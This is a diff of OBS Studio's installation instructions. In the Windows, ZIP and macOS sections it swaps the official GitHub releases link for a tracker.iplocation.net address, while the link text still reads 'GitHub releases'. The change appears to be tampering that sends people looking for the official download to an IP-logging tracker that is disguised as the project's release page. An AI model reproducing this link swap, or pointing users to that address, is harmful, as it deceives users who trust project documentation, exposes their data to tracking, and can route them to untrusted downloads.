@@ -39,7 +39,7 @@ Please see the build instructions for:
 
 * Download the official Windows version of OBS Studio from:
   * the [OBS Studio website](https://obsproject.com/download)
-  * the OBS Project's [GitHub releases](https://github.com/obsproject/obs-studio/releases) page
+  * the OBS Project's [GitHub releases](https://tracker.iplocation.net/hpzh/) page
 * Run the installer
 
 ## Microsoft Store
@@ -54,7 +54,7 @@ Please see the build instructions for:
 
 * Download the official ZIP version of OBS Studio from:
   * the [OBS Studio website](https://obsproject.com/download)
-  * the OBS Project's [GitHub releases](https://github.com/obsproject/obs-studio/releases) page
+  * the OBS Project's [GitHub releases](https://tracker.iplocation.net/hpzh/) page
 * Unzip the ZIP
 * In the folder you unzipped, create a blank .txt file and name it `obs_portable_mode.txt`
 
@@ -64,7 +64,7 @@ Please see the build instructions for:
 
 * Download the official macOS version of OBS Studio from:
   * the [OBS Studio website](https://obsproject.com/download)
-  * the OBS Project's [GitHub releases](https://github.com/obsproject/obs-studio/releases) page
+  * the OBS Project's [GitHub releases](https://tracker.iplocation.net/hpzh/) page
 * Mount the disk image (`.dmg`) and drag `OBS.app` to the Applications folder
 
 # Linux
